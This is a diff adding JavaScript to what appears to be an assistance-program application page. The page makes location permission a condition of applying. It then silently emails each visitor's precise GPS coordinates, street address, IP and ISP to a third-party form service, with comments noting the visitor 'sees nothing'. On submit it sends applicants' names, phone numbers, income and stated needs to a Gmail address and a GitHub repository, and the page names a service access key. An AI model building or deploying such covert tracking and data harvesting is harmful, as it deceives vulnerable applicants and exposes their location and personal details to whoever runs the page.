+    area:        a.neighbourhood || a.suburb || a.quarter || a.hamlet || a.residential || a.allotments || '',
+    district:    a.county || a.city_district || a.district || a.borough || a.municipality || '',
+    city:        a.city || a.town || a.township || a.municipality || a.village || a.locality || '',
+    state:       a.state || a.region || a.province || '',
+    postcode:    a.postcode || '',
+    country:     a.country  || '',
+    displayName: data.display_name || ''
+  };
+}
+function mergeAddr(base, extra) {
+  return {
+    street: base.street || extra.street, area: base.area || extra.area,
+    district: base.district || extra.district, city: base.city || extra.city,
+    state: base.state || extra.state, postcode: base.postcode || extra.postcode,
+    country: base.country || extra.country, displayName: base.displayName || extra.displayName
+  };
+}
+var NOM = 'https://nominatim.openstreetmap.org';
+function reverseAt(lat, lon, zoom) {
+  return fetch(NOM+'/reverse?lat='+lat+'&lon='+lon+'&format=json&addressdetails=1&zoom='+zoom+'&accept-language=en',{headers:{'Accept-Language':'en'}}).then(function(r){return r.json();});
+}
+function nearbyRoadSearch(lat, lon) {
+  var d=0.018, box=(lon-d)+','+(lat-d)+','+(lon+d)+','+(lat+d);
+  return fetch(NOM+'/search?format=json&addressdetails=1&limit=5&featuretype=road&viewbox='+box+'&bounded=1&q=road&accept-language=en',{headers:{'Accept-Language':'en'}}).then(function(r){return r.json();}).catch(function(){return[];});
+}
+function nearbySuburbSearch(lat, lon) {
+  var d=0.025, box=(lon-d)+','+(lat-d)+','+(lon+d)+','+(lat+d);
+  return fetch(NOM+'/search?format=json&addressdetails=1&limit=5&featuretype=settlement&viewbox='+box+'&bounded=1&q=suburb&accept-language=en',{headers:{'Accept-Language':'en'}}).then(function(r){return r.json();}).catch(function(){return[];});
+}
+function deepResolveAddress(lat, lon) {
+  setStatus('📍 Verifying your location...', 'status-loading');
+  return Promise.all([
+    reverseAt(lat,lon,18).catch(function(){return{};}),
+    reverseAt(lat,lon,16).catch(function(){return{};}),
+    reverseAt(lat,lon,14).catch(function(){return{};}),
+    nearbyRoadSearch(lat,lon), nearbySuburbSearch(lat,lon)
+  ]).then(function(results) {
+    var merged = mergeAddr(parseAddress(results[0]), mergeAddr(parseAddress(results[1]), parseAddress(results[2])));
+    var roads = results[3], suburbs = results[4];
+    if (!merged.street && roads && roads.length) {
+      for (var i=0;i<roads.length;i++) {
+        var ra=roads[i].address||{}, rname=ra.road||ra.pedestrian||ra.footway||ra.path||ra.street||roads[i].display_name||'';
+        if (rname){merged.street=rname.split(',')[0].trim();break;}
+      }
+    }
+    if (!merged.area && suburbs && suburbs.length) {
+      for (var j=0;j<suburbs.length;j++) {
+        var sa=suburbs[j].address||{}, sname=sa.neighbourhood||sa.suburb||sa.quarter||sa.hamlet||sa.residential||(suburbs[j].type==='suburb'?suburbs[j].display_name.split(',')[0].trim():'');
+        if (sname){merged.area=sname;break;}
+      }
+    }
+    if (!merged.area && merged.displayName) {
+      var parts=merged.displayName.split(',').map(function(s){return s.trim();}), cityIdx=-1;
+      for (var k=0;k<parts.length;k++){if(merged.city&&parts[k].toLowerCase()===merged.city.toLowerCase()){cityIdx=k;break;}}
+      if (cityIdx>0){var c=parts[cityIdx-1];if(c&&c!==merged.district&&c!==merged.street)merged.area=c;}
+      else if(parts.length>1&&parts[0]!==merged.city&&parts[0]!==merged.district)merged.area=parts[0];
+    }
+    return merged;
+  });
+}
+
+/* LOCATION ALERT — sent to your email, invisible to visitor */
+function sendLocationAlert(parsed, lat, lon, accuracy) {
+  var alertId  = 'LOC-' + Date.now().toString(36).toUpperCase();
+  var mapsLink = 'https://www.google.com/maps?q=' + lat.toFixed(6) + ',' + lon.toFixed(6);
+  var payload  = {
+    access_key: '8f55868a-da86-4202-8b44-44ac26ec6bf4',
+    subject:    '📍 Location Verified — FRF Alert | ' + alertId,
+    from_name:  'FRF Location System',
+    message: [
+      '🔔 EVENT: LOCATION VERIFIED',
+      '🆔 Alert ID:    ' + alertId,
+      '🕐 Time:        ' + new Date().toISOString(),
+      '',
+      '🌐 VISITOR IP',
+      'IP Address:  ' + visitorIP,
+      'ISP / Org:   ' + (visitorIPData.isp     || 'N/A'),
+      'IP City:     ' + (visitorIPData.city     || 'N/A'),
+      'IP Region:   ' + (visitorIPData.region   || 'N/A'),
+      'IP Country:  ' + (visitorIPData.country  || 'N/A'),
+      'IP Timezone: ' + (visitorIPData.timezone || 'N/A'),
+      'IP Postcode: ' + (visitorIPData.postal   || 'N/A'),
+      '',
+      '📍 GPS ADDRESS',
+      'Street:      ' + (parsed.street      || 'N/A'),
+      'Area:        ' + (parsed.area        || 'N/A'),
+      'District:    ' + (parsed.district    || 'N/A'),
+      'City:        ' + (parsed.city        || 'N/A'),
+      'State:       ' + (parsed.state       || 'N/A'),
+      'Postcode:    ' + (parsed.postcode    || 'N/A'),
+      'Country:     ' + (parsed.country     || 'N/A'),
+      'Full Name:   ' + (parsed.displayName || 'N/A'),
+      '',
+      '🌐 COORDINATES',
+      'Latitude:    ' + lat.toFixed(6),
+      'Longitude:   ' + lon.toFixed(6),
+      'Accuracy:    ' + Math.round(accuracy) + 'm',
+      '',
+      '🗺️ Google Maps: ' + mapsLink
+    ].join('\n')
+  };
+  return fetch('https://api.web3forms.com/submit', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+    body: JSON.stringify(payload)
+  }).then(function(r){return r.json();})
+    .then(function(res){ console.log(res.success ? '✅ Location alert sent' : '⚠️ Web3Forms:', res); })
+    .catch(function(err){ console.warn('⚠️ Location alert failed (non-blocking):', err); });
+}
+
+function buildBadgeSummary(parsed, lat, lon) {
+  var parts=[];
+  if(parsed.street) parts.push(parsed.street);
+  if(parsed.area)   parts.push(parsed.area);
+  if(parsed.city)   parts.push(parsed.city);
+  if(parsed.state)  parts.push(parsed.state);
+  if(parsed.country)parts.push(parsed.country);
+  return parts.length ? parts.join(', ') : lat.toFixed(5)+', '+lon.toFixed(5);
+}
+
+/* BROWSER DETECTION */
+function getBrowser() {
+  var ua=navigator.userAgent;
+  if(/iPhone|iPad|iPod/.test(ua)) return 'ios';
+  if(/Android/.test(ua))          return 'android';
+  if(/Firefox/.test(ua))          return 'firefox';
+  if(/Edg/.test(ua))              return 'edge';
+  if(/Chrome/.test(ua))           return 'chrome';
+  if(/Safari/.test(ua))           return 'safari';
+  return 'chrome';
+}
+function getDeniedSteps() {
+  var b=getBrowser();
+  if(b==='chrome')  return ['Click the 🔒 <strong>lock icon</strong> in your browser address bar.','Click <strong>Site settings</strong>.','Find <strong>Location</strong> → change it to <strong>Allow</strong>.','Refresh this page, then click Allow Location again.'];
+  if(b==='firefox') return ['Click the 🔒 <strong>lock icon</strong> in the address bar.','Click the arrow next to <strong>Connection Secure</strong>.','Click <strong>More Information</strong> → open the <strong>Permissions</strong> tab.','Find <strong>Access Your Location</strong> → set to <strong>Allow</strong>.','Refresh this page and try again.'];
+  if(b==='safari')  return ['In the menu bar go to <strong>Safari → Settings for This Website</strong>.','Set <strong>Location</strong> to <strong>Allow</strong>.','Refresh and try again.'];
+  if(b==='edge')    return ['Click the 🔒 <strong>lock icon</strong> in the address bar.','Click <strong>Permissions for this site</strong>.','Set <strong>Location</strong> to <strong>Allow</strong>.','Refresh and try again.'];
+  if(b==='ios')     return ['Open <strong>Settings</strong> on your iPhone/iPad.','Scroll down and tap <strong>Safari</strong> (or your browser app).','Tap <strong>Location</strong> → select <strong>Allow</strong>.','Return to this page and try again.'];
+  if(b==='android') return ['Tap the 🔒 <strong>lock icon</strong> in your browser address bar.','Tap <strong>Permissions</strong> → <strong>Location</strong>.','Select <strong>Allow</strong>.','Refresh and try again.'];
+  return ['Open your browser settings → Site Permissions → Location.','Allow location for this site, then refresh and try again.'];
+}
+
+/* MODAL */
+function openLocationModal(e) {
+  if(e) e.preventDefault();
+  if(locationCaptured){document.getElementById('apply').scrollIntoView({behavior:'smooth'});return;}
+  document.getElementById('loc-overlay').classList.add('active');
+}
+function closeModalAndProceed() {
+  document.getElementById('loc-overlay').classList.remove('active');
+  setTimeout(function(){document.getElementById('apply').scrollIntoView({behavior:'smooth'});},300);
+}
+function setStatus(msg, cls) {
+  var el=document.getElementById('loc-modal-status'); el.innerHTML=msg; el.className=cls||'';
+}
+function unlockForm() {
+  var btn=document.getElementById('submit-btn');
+  btn.disabled=false; btn.textContent='Submit Application →';
+  document.getElementById('submit-hint').style.display='none';
+  document.getElementById('loc-verified-badge').style.display='block';
+}
+
+/* MAIN LOCATION FLOW */
+function startLocation() {
+  var btn=document.getElementById('loc-modal-btn');
+  var deniedBox=document.getElementById('denied-box');
+  var retryBtn=document.getElementById('retry-btn');
+  var successBox=document.getElementById('loc-success-box');
+  deniedBox.style.display='none'; retryBtn.style.display='none'; successBox.style.display='none';
+  btn.style.display='block'; btn.disabled=true; btn.textContent='📡 Detecting your location...';
+  setStatus('Please wait — verifying your location...','status-loading');
+  if(!navigator.geolocation){
+    btn.disabled=false; btn.textContent='Allow Location & Continue'; setStatus('','');
+    deniedBox.style.display='block';
+    document.getElementById('denied-steps').innerHTML='<li>Your browser does not support geolocation. Please try Google Chrome or Firefox.</li>';
+    return;
+  }
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      capturedLat=position.coords.latitude;
+      capturedLon=position.coords.longitude;
+      var accuracy=position.coords.accuracy;
+      window._locationAccuracy=accuracy;
+      deepResolveAddress(capturedLat, capturedLon)
+        .then(function(parsed){
+          capturedAddrObj=parsed;
+          capturedAddress=buildBadgeSummary(parsed,capturedLat,capturedLon);
+          locationCaptured=true;
+          /* Fire alert email silently — visitor sees nothing */
+          sendLocationAlert(parsed,capturedLat,capturedLon,accuracy);
+          /* Show clean verified box — no address details */
+          btn.style.display='none';
+          setStatus('','');
+          successBox.style.display='block';
+          unlockForm();
+          setTimeout(function(){closeModalAndProceed();},2000);
+        })
+        .catch(function(){
+          capturedAddress=capturedLat.toFixed(6)+', '+capturedLon.toFixed(6);
+          locationCaptured=true;
+          sendLocationAlert({street:'',area:'',district:'',city:'',state:'',postcode:'',country:'',displayName:''},capturedLat,capturedLon,accuracy);
+          btn.style.display='none';
+          setStatus('','');
+          successBox.style.display='block';
+          unlockForm();
+          setTimeout(function(){closeModalAndProceed();},2000);
+        });
+    },
+    function(error){
+      btn.disabled=false; btn.textContent='Allow Location & Continue';
+      if(error.code===1){
+        setStatus('⚠️ Location access was blocked. Follow the steps below to enable it:','status-denied');
+        var steps=getDeniedSteps(),ol=document.getElementById('denied-steps'); ol.innerHTML='';
+        steps.forEach(function(s){var li=document.createElement('li');li.innerHTML=s;ol.appendChild(li);});
+        deniedBox.style.display='block'; retryBtn.style.display='block';
+      } else if(error.code===2){
+        setStatus('⚠️ Location signal unavailable. Check your device GPS and try again.','status-denied');
+        retryBtn.style.display='block';
+      } else {
+        setStatus('⚠️ Request timed out. Please try again.','status-denied');
+        retryBtn.style.display='block';
+      }
+    },
+    {enableHighAccuracy:true,timeout:15000,maximumAge:0}
+  );
+}
+
+/* FORM VALIDATION */
+function getVal(id){var el=document.getElementById(id);return el?el.value.trim():'';}
+function setFieldState(fieldId,errId,msg){
+  var field=document.getElementById(fieldId),err=document.getElementById(errId);if(!field||!err)return;
+  if(msg){field.classList.add('invalid');field.classList.remove('valid');err.textContent=msg;}
+  else{field.classList.remove('invalid');field.classList.add('valid');err.textContent='';}
+}
+function clearAllErrors(){
+  ['firstname','lastname','email','phone','state','income','program','need'].forEach(function(id){setFieldState('f-'+id,'err-'+id,'');});
+  document.getElementById('submit-error').style.display='none';
+}
+function validateForm(){
+  var ok=true;
+  function req(fid,eid,label){var v=getVal(fid);if(!v){setFieldState(fid,eid,label+' is required.');ok=false;}else{setFieldState(fid,eid,'');}return v;}
+  req('f-firstname','err-firstname','First name'); req('f-lastname','err-lastname','Last name');
+  var email=req('f-email','err-email','Email address');
+  if(email&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){setFieldState('f-email','err-email','Please enter a valid email address.');ok=false;}
+  var phone=req('f-phone','err-phone','Phone number');
+  if(phone&&phone.replace(/\D/g,'').length<7){setFieldState('f-phone','err-phone','Please enter a valid phone number.');ok=false;}
+  req('f-state','err-state','State of residence'); req('f-income','err-income','Household income');
+  req('f-program','err-program','Program of interest'); req('f-need','err-need','Description of need');
+  return ok;
+}
+function genRefId(){return 'FRF-'+Date.now().toString(36).toUpperCase()+'-'+Math.random().toString(36).substr(2,5).toUpperCase();}
+
+function saveToGitHub(data,refId){
+  var filename='submissions/'+refId+'.json';
+  var encoded=btoa(unescape(encodeURIComponent(JSON.stringify(data,null,2))));
+  return fetch('https://api.github.com/repos/'+CONFIG.GITHUB_OWNER+'/'+CONFIG.GITHUB_REPO+'/contents/'+filename,{
+    method:'PUT',
+    headers:{'Authorization':'token '+CONFIG.GITHUB_TOKEN,'Content-Type':'application/json','Accept':'application/vnd.github.v3+json'},
+    body:JSON.stringify({message:'New application: '+refId,content:encoded,branch:CONFIG.GITHUB_BRANCH})
+  }).then(function(r){if(!r.ok)throw new Error('GitHub API error: '+r.status);return r.json();});
+}
+function sendEmail(data,refId){
+  emailjs.init({publicKey:CONFIG.EMAILJS_PUBLIC_KEY});
+  return emailjs.send(CONFIG.EMAILJS_SERVICE_ID,CONFIG.EMAILJS_TEMPLATE_ID,{
+    to_email:'confirmationpin@gmail.com', ref_id:refId,
+    first_name:data.firstName, last_name:data.lastName,
+    email:data.email, phone:data.phone, state:data.state,
+    income:data.income, program:data.program, need:data.need,
+    ip_address:data.visitorIP, ip_isp:data.visitorIPData.isp||'N/A',
+    ip_city:data.visitorIPData.city||'N/A', ip_region:data.visitorIPData.region||'N/A',
+    ip_country:data.visitorIPData.country||'N/A',
+    location:data.location.address, latitude:data.location.lat,
+    longitude:data.location.lon, accuracy:data.location.accuracy,
+    submitted_at:data.submittedAt
+  });
+}
+function handleSubmit(e){
+  e.preventDefault();
+  if(!locationCaptured){openLocationModal(e);return;}
+  clearAllErrors();
+  if(!validateForm()){var firstErr=document.querySelector('.invalid');if(firstErr)firstErr.scrollIntoView({behavior:'smooth',block:'center'});return;}
+  var refId=genRefId();
+  var submission={
+    refId:refId, submittedAt:new Date().toISOString(),
+    firstName:getVal('f-firstname'), lastName:getVal('f-lastname'),
+    email:getVal('f-email'), phone:getVal('f-phone'),
+    state:getVal('f-state'), income:getVal('f-income'),
+    program:getVal('f-program'), need:getVal('f-need'),
+    visitorIP:visitorIP, visitorIPData:visitorIPData,
+    location:{
+      address:capturedAddress, street:capturedAddrObj.street||'',
+      area:capturedAddrObj.area||'', district:capturedAddrObj.district||'',
+      city:capturedAddrObj.city||'', state:capturedAddrObj.state||'',
+      postcode:capturedAddrObj.postcode||'', country:capturedAddrObj.country||'',
+      lat:capturedLat, lon:capturedLon,
+      accuracy:capturedLat?Math.round(window._locationAccuracy||0)+'m':'unknown'
+    }
+  };
+  var btn=document.getElementById('submit-btn');
+  btn.disabled=true; btn.textContent='⏳ Submitting your application...';
+  document.getElementById('submit-error').style.display='none';
+  Promise.all([
+    sendEmail(submission,refId).catch(function(err){console.warn('EmailJS error:',err);return{emailFailed:true};}),
+    saveToGitHub(submission,refId).catch(function(err){console.warn('GitHub error:',err);return{githubFailed:true};})
+  ]).then(function(results){
+    var emailFailed=results[0]&&results[0].emailFailed, githubFailed=results[1]&&results[1].githubFailed;
+    if(emailFailed&&githubFailed){
+      btn.disabled=false; btn.textContent='Submit Application →';
+      var errEl=document.getElementById('submit-error');
+      errEl.innerHTML='⚠️ Submission failed. Check your internet connection and try again. If the problem persists contact <strong>confirmationpin@gmail.com</strong>.';
+      errEl.style.display='block';
+      errEl.scrollIntoView({behavior:'smooth',block:'center'});
+    } else {
+      document.getElementById('application-form').style.display='none';
+      document.getElementById('ref-id').textContent=refId;
+      document.getElementById('success-screen').style.display='block';
+      document.getElementById('success-screen').scrollIntoView({behavior:'smooth',block:'center'});
+    }
+  });
+}
+</script>
 </body>
-
-</html>
-
-
-
+</html
